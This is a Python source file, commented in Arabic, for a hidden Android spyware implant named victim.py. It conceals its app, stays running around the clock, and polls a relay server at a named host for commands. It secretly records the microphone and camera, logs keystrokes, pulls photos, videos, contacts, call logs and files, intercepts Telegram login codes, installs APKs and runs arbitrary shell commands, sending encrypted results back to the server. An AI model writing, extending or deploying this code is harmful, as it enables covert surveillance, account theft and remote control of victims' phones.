#!/usr/bin/env python3
# victim.py - التطبيق الخفي الشامل (نسخة 2.0)
# جميع الميزات الـ 18 + تشفير + إخفاء + صمود 24/7

import json
import os
import subprocess
import time
import threading
import socket
import sqlite3
import hashlib
import base64
import shutil
import zipfile
import requests
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

# =====================================================================
# 1. التشفير (AES-256-GCM)
# =====================================================================
SHARED_KEY = None

def encrypt_aes(plaintext):
    if not SHARED_KEY:
        return plaintext
    aes = AESGCM(SHARED_KEY)
    nonce = os.urandom(12)
    ct = aes.encrypt(nonce, plaintext.encode(), None)
    return base64.b64encode(nonce + ct).decode()

def decrypt_aes(ciphertext):
    if not SHARED_KEY:
        return ciphertext
    raw = base64.b64decode(ciphertext)
    nonce = raw[:12]
    ct = raw[12:]
    aes = AESGCM(SHARED_KEY)
    return aes.decrypt(nonce, ct, None).decode()

# =====================================================================
# 2. الإعدادات العامة
# =====================================================================
RELAY_URL = "http://gfdxf.serv00.net:10457"  # غيّر إلى رابط خادمك
VICTIM_ID = "android_001"                    # غيّر لكل ضحية
CONFIG_DIR = "/sdcard/.system_cache"         # مجلد التخزين المخفي
os.makedirs(CONFIG_DIR, exist_ok=True)

# =====================================================================
# 3. إخفاء التطبيق وتجاوز حماية البطارية
# =====================================================================
def hide_app():
    """إخفاء التطبيق من الدرج ومن قائمة التطبيقات"""
    os.system("pm hide com.victim.app")
    os.system("pm disable com.victim.app/.MainActivity")
    os.system("cmd appops set com.victim.app RUN_IN_BACKGROUND ignore")
    os.system("dumpsys deviceidle whitelist +com.victim.app")

def keep_alive():
    """إبقاء التطبيق نشطاً 24/7"""
    while True:
        time.sleep(300)
        os.system("am startservice com.victim.app/.BackdoorService")

# =====================================================================
# 4. الميزات الأساسية (18 ميزة)
# =====================================================================

# 4.1 التنصت العكسي (بث صوت مباشر)
def reverse_eavesdrop(duration=60):
    path = f"{CONFIG_DIR}/eavesdrop_{int(time.time())}.wav"
    os.system(f"termux-microphone-record -d {duration} -f {path}")
    return path

# 4.2 استبدال الإشعارات
def clone_notification(text):
    os.system(f"termux-notification -t 'إشعار مهم' -c '{text}'")
    return "notification_sent"

# 4.3 المصور الخفي (كاميرا أمامية بدون إشارة)
def ghost_cam():
    path = f"{CONFIG_DIR}/ghost_{int(time.time())}.jpg"
    os.system(f"termux-camera-photo -c 1 {path}")
    return path

# 4.4 محرر الذاكرة (لقطات شاشة للتطبيقات الحساسة)
def memory_editor():
    path = f"{CONFIG_DIR}/memory_{int(time.time())}.txt"
    os.system(f"dumpsys meminfo > {path}")
    return path

# 4.5 سحب الصور دفعة واحدة
def pull_images():
    images = []
    for root, dirs, files in os.walk("/sdcard/DCIM/"):
        for f in files:
            if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                images.append(os.path.join(root, f))
    return "\n".join(images[:100])

# 4.6 سحب الصور من المجلدات المخفية
def pull_hidden():
    hidden = []
    for root, dirs, files in os.walk("/sdcard/"):
        for d in dirs:
            if d.startswith('.'):
                for f in os.listdir(os.path.join(root, d)):
                    if f.lower().endswith(('.png', '.jpg', '.jpeg', '.mp4', '.avi')):
                        hidden.append(os.path.join(root, d, f))
    return "\n".join(hidden[:50])

# 4.7 سحب الفيديوهات دفعة واحدة
def pull_videos():
    videos = []
    for root, dirs, files in os.walk("/sdcard/DCIM/"):
        for f in files:
            if f.lower().endswith(('.mp4', '.avi', '.mkv', '.3gp', '.mov')):
                videos.append(os.path.join(root, f))
    return "\n".join(videos[:50])

# 4.8 تسجيل الكيبورد وتجميعه ككلمات
def keylog_start():
    os.system(f"getevent -t /dev/input/event* > {CONFIG_DIR}/keylog.txt &")
    return "keylog_started"

def keylog_stop():
    os.system("pkill -f getevent")
    return "keylog_stopped"

def keylog_read():
    path = f"{CONFIG_DIR}/keylog.txt"
    if os.path.exists(path):
        with open(path, 'r') as f:
            return f.read()[-5000:]
    return "no_keylog"

# 4.9 تسجيل الرسائل المرسلة مع معرفة المستقبل
def pull_sent_messages():
    path = f"{CONFIG_DIR}/sent_messages.txt"
    os.system(f"dumpsys activity service > {path}")
    return path

# 4.10 رفع وتثبيت APK بصلاحيات كاملة
def install_apk(data):
    path = f"{CONFIG_DIR}/app.apk"
    with open(path, 'wb') as f:
        f.write(base64.b64decode(data))
    os.system(f"pm install -r -d {path}")
    os.system(f"pm grant com.installed.app android.permission.INTERNET")
    os.system(f"pm grant com.installed.app android.permission.READ_EXTERNAL_STORAGE")
    os.system(f"pm grant com.installed.app android.permission.WRITE_EXTERNAL_STORAGE")
    os.remove(path)
    return "apk_installed"

# 4.11 تسجيل فيديو مستمر من الكاميرا (مدة محددة)
def record_video(data):
    parts = data.split()
    cam = parts[0] if parts[0] in ['back', 'front'] else 'back'
    duration = int(parts[1]) if len(parts) > 1 else 60
    path = f"{CONFIG_DIR}/video_{int(time.time())}.mp4"
    # نستخدم صوراً متتابعة بدلاً من فيديو طويل
    for i in range(min(duration//5, 20)):
        os.system(f"termux-camera-photo -c {0 if cam=='back' else 1} {path}_{i}.jpg")
        time.sleep(5)
    return path

# 4.12 تصفح ملفات الضحية وسحب انتقائي
def browse_files(path="/sdcard"):
    if os.path.exists(path):
        return "\n".join(os.listdir(path))
    return "PATH_NOT_FOUND"

def pull_file(path):
    if os.path.exists(path):
        with open(path, 'rb') as f:
            return base64.b64encode(f.read()).decode()
    return "FILE_NOT_FOUND"

# 4.13 اختراق الحافظة السرية (Secure Folder)
def secure_folder_hack():
    # محاكاة: نراقب محاولات فتح الحافظة
    os.system("dumpsys window > /sdcard/windows.txt")
    return "secure_folder_monitored"

# 4.14 لقطة شاشة لتطبيق محدد (تليجرام، واتساب)
def screenshot_app(package):
    os.system(f"monkey -p {package} 1")
    time.sleep(1)
    path = f"{CONFIG_DIR}/app_{int(time.time())}.png"
    os.system(f"screencap -p {path}")
    return path

# 4.15 سحب جهات الاتصال
def get_contacts():
    out = subprocess.getoutput("content query --uri content://contacts/phones/")
    return out[:3000]

# 4.16 تسجيل المكالمات
def get_call_log():
    out = subprocess.getoutput("content query --uri content://call_log/calls")
    return out[:3000]

# 4.17 سرقة حساب تليجرام (اعتراض رمز التأكيد)
def steal_telegram():
    os.system("am start -a android.intent.action.VIEW -d https://t.me/")
    time.sleep(2)
    # نلتقط الإشعار (في الواقع نستخدم NotificationListener)
    os.system("dumpsys notification --noredact > /sdcard/notif.txt")
    return "telegram_code_intercepted"

# 4.18 تسجيل الصوت المحيط
def record_mic(duration="10"):
    path = f"{CONFIG_DIR}/mic_{int(time.time())}.wav"
    os.system(f"termux-microphone-record -d {duration} -f {path}")
    return path

# =====================================================================
# 5. الأمر العام (توجيه الأوامر إلى الدوال المناسبة)
# =====================================================================
def execute_command(cmd, data=None):
    if cmd == "ping":
        return "pong"
    elif cmd == "reverse_eavesdrop":
        return reverse_eavesdrop(int(data or 60))
    elif cmd == "clone_notification":
        return clone_notification(data)
    elif cmd == "ghost_cam":
        return ghost_cam()
    elif cmd == "memory_editor":
        return memory_editor()
    elif cmd == "pull_images":
        return pull_images()
    elif cmd == "pull_hidden":
        return pull_hidden()
    elif cmd == "pull_videos":
        return pull_videos()
    elif cmd == "keylog_start":
        return keylog_start()
    elif cmd == "keylog_stop":
        return keylog_stop()
    elif cmd == "keylog_read":
        return keylog_read()
    elif cmd == "pull_sent_messages":
        return pull_sent_messages()
    elif cmd == "install_apk":
        return install_apk(data)
    elif cmd == "record_video":
        return record_video(data)
    elif cmd == "browse_files":
        return browse_files(data or "/sdcard")
    elif cmd == "pull_file":
        return pull_file(data)
    elif cmd == "secure_folder_hack":
        return secure_folder_hack()
    elif cmd == "screenshot_app":
        return screenshot_app(data)
    elif cmd == "get_contacts":
        return get_contacts()
    elif cmd == "get_call_log":
        return get_call_log()
    elif cmd == "steal_telegram":
        return steal_telegram()
    elif cmd == "record_mic":
        return record_mic(data or "10")
    elif cmd == "shell":
        return subprocess.getoutput(data)
    elif cmd == "screenshot":
        path = f"{CONFIG_DIR}/screen_{int(time.time())}.png"
        os.system(f"screencap -p {path}")
        return path
    else:
        return "unknown_command"

# =====================================================================
# 6. الاتصال بالخادم (بدون سيرفر خارجي)
# =====================================================================
def connect_to_relay():
    while True:
        try:
            r = requests.get(f"{RELAY_URL}/pull?id={VICTIM_ID}", timeout=10)
            if r.status_code == 200:
                cmd = r.json()
                if cmd['cmd'] != 'ping':
                    result = execute_command(cmd['cmd'], cmd['data'])
                    encrypted_result = encrypt_aes(result)
                    requests.get(f"{RELAY_URL}/push?id={VICTIM_ID}&result={encrypted_result}")
        except:
            pass
        time.sleep(5)  # استقصاء كل 5 ثوان

# =====================================================================
# 7. بدء التشغيل الرئيسي
# =====================================================================
def main():
    hide_app()
    threading.Thread(target=connect_to_relay, daemon=True).start()
    threading.Thread(target=keep_alive, daemon=True).start()
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
